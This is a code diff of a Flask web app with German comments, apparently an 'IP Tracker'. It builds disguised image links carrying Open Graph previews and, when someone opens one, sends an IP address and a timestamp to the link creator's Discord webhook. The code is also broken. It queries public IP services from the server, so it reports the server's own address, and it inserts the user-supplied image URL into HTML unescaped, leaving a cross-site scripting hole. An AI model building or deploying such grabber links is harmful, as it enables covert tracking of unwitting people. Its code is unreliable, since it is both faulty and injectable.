@@ -25,21 +25,20 @@ def upload_image():
         if not webhook_url:
             return jsonify({'error': 'Webhook URL ist erforderlich'}), 400
         
-        # Generiere einzigartige Tracking-ID
-        tracking_id = secrets.token_urlsafe(16)
+        # Generiere Tracking-ID
+        tracking_id = secrets.token_urlsafe(8)
         
-        # Erstelle Tracking-Daten
+        # Erstelle einfache Tracking-Daten
         tracking_data = {
-            'id': tracking_id,
             'image_url': image_url,
             'webhook_url': webhook_url,
-            'created_at': datetime.now().isoformat()
+            'tracking_id': tracking_id
         }
         
-        # Kodiere Tracking-Daten als base64 für die URL
+        # Kodiere Daten
         tracking_data_encoded = base64.b64encode(json.dumps(tracking_data).encode()).decode()
         
-        # Generiere Tracking-URL mit eingebetteten Daten
+        # Generiere Tracking-URL
         protocol = 'https://'
         host = request.host
         tracking_url = f"{protocol}{host}/track?data={tracking_data_encoded}"
@@ -55,37 +54,48 @@ def upload_image():
 
 @app.route('/track')
 def track_image():
-    # Hole die base64-kodierten Daten aus der URL
     tracking_data_encoded = request.args.get('data')
     
     if not tracking_data_encoded:
         return "Tracking-Daten fehlen", 400
     
     try:
-        # Dekodiere die Tracking-Daten
+        # Dekodiere Daten
         tracking_data = json.loads(base64.b64decode(tracking_data_encoded).decode())
         
-        # Hole IP-Adresse von myip.com
-        real_ip = "Unbekannt"
+        # Hole IP-Adresse
+        ip_address = "Unbekannt"
         try:
-            ip_response = urllib.request.urlopen('https://api.myip.com', timeout=5)
-            real_ip = ip_response.read().decode().strip()
+            # Versuche verschiedene IP-Services
+            services = [
+                'https://api.ipify.org?format=json',
+                'https://ipinfo.io/json',
+                'https://api.myip.com'
+            ]
+            
+            for service in services:
+                try:
+                    response = urllib.request.urlopen(service, timeout=3)
+                    data = json.loads(response.read().decode())
+                    if 'ip' in data:
+                        ip_address = data['ip']
+                        break
+                except:
+                    continue
         except:
-            try:
-                ip_response = urllib.request.urlopen('https://ipinfo.io/json', timeout=5)
-                ip_data = json.loads(ip_response.read().decode())
-                real_ip = ip_data.get('ip', 'Unbekannt')
-            except:
-                pass
+            ip_address = request.remote_addr or "Unbekannt"
         
         # Sende Discord-Benachrichtigung
         try:
-            webhook_url = tracking_data['webhook_url']
-            send_discord_notification(webhook_url, real_ip, tracking_data['id'])
+            send_simple_discord_message(
+                tracking_data['webhook_url'], 
+                ip_address, 
+                tracking_data['tracking_id']
+            )
         except Exception as e:
             print(f"Discord Fehler: {e}")
         
-        # Zeige Tracking-Seite mit echtem Bild
+        # Zeige Bild
         image_url = tracking_data['image_url']
         
         return f"""
@@ -96,15 +106,8 @@ def track_image():
     <meta property="og:title" content="Tracking Bild">
     <meta property="og:description" content="Jemand hat dein Bild angesehen">
     <meta property="og:image" content="{image_url}">
-    <meta property="og:image:width" content="800">
-    <meta property="og:image:height" content="600">
     <meta property="og:url" content="{request.url}">
     <meta property="og:type" content="website">
-    <meta property="og:site_name" content="IP Tracker">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Tracking Bild">
-    <meta name="twitter:description" content="Jemand hat dein Bild angesehen">
-    <meta name="twitter:image" content="{image_url}">
     <style>
         body {{ 
             margin: 0; 
@@ -115,28 +118,16 @@ def track_image():
             align-items: center; 
             min-height: 100vh; 
         }}
-        .container {{
-            text-align: center;
-            max-width: 100%;
-        }}
         img {{ 
             max-width: 100%; 
             height: auto; 
             max-height: 90vh;
             object-fit: contain;
         }}
-        .loading {{
-            color: white;
-            font-family: Arial, sans-serif;
-            font-size: 18px;
-        }}
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="loading">Bild wird geladen...</div>
-        <img src="{image_url}" alt="Tracking Bild" onload="document.querySelector('.loading').style.display='none'">
-    </div>
+    <img src="{image_url}" alt="Tracking Bild">
 </body>
 </html>
         """
@@ -144,38 +135,21 @@ def track_image():
     except Exception as e:
         return f"Fehler: {str(e)}", 500
 
-def send_discord_notification(webhook_url, ip_address, tracking_id):
-    """Sendet eine Benachrichtigung an Discord"""
+def send_simple_discord_message(webhook_url, ip_address, tracking_id):
+    """Sendet einfache Discord-Nachricht"""
     try:
-        embed = {
-            "title": "🔍 Bild wurde angesehen!",
-            "description": f"Jemand hat dein Tracking-Bild angesehen",
-            "color": 5814783,  # Blau
-            "fields": [
-                {
-                    "name": "🌐 IP-Adresse",
-                    "value": f"```\n{ip_address}\n```",
-                    "inline": True
-                },
-                {
-                    "name": "🕐 Uhrzeit",
-                    "value": f"```\n{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n```",
-                    "inline": True
-                },
-                {
-                    "name": "🔗 Tracking-ID",
-                    "value": f"```\n{tracking_id}\n```",
-                    "inline": False
-                }
-            ],
-            "footer": {
-                "text": "IP Tracker - Automatische Benachrichtigung"
-            },
-            "timestamp": datetime.now().isoformat()
-        }
+        # Einfache Text-Nachricht statt Embed
+        message = f"""🔍 **Bild wurde angesehen!**
+
+**IP-Adresse:** `{ip_address}`
+**Uhrzeit:** `{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}`
+**Tracking-ID:** `{tracking_id}`
+
+---
+*IP Tracker - Automatische Benachrichtigung*"""
         
         data = {
-            "embeds": [embed]
+            "content": message
         }
         
         req = urllib.request.Request(
@@ -189,11 +163,11 @@ def send_discord_notification(webhook_url, ip_address, tracking_id):
             
     except Exception as e:
         print(f"Fehler beim Senden an Discord: {e}")
-        return str(e)
+        raise
 
 @app.route('/health')
 def health_check():
-    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})
+    return jsonify({'status': 'healthy'})
 
 # Vercel Handler
 def handler(request):
